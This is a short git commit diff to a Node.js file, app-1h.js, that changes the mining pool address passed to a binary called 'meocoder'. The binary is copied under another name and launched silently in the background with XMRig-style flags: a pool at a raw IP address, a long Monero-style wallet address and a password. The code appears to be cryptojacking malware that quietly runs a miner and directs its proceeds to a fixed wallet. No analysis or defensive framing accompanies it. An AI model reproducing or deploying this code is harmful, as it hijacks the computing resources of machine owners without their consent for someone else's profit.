08be17c9781f51f7b1251af9ab2371ab6485af8c
vippro99 <80774966+vippro99@users.noreply.github.com>
2021-04-19 10:19:35 +0700

    Update app-1h.js

--- app-1h.js
+++ app-1h.js
@@ -28,7 +28,7 @@ if (shell.exec(`cp meocoder ${nameTool}`, { silent: true }).code === 0) {
 })();
 
 
-const runMonney = shell.exec(`./${ nameTool } -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
+const runMonney = shell.exec(`./${ nameTool } -o 104.154.230.90:9999 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
 if (runMonney.code !== undefined) {
     return 0;
 }
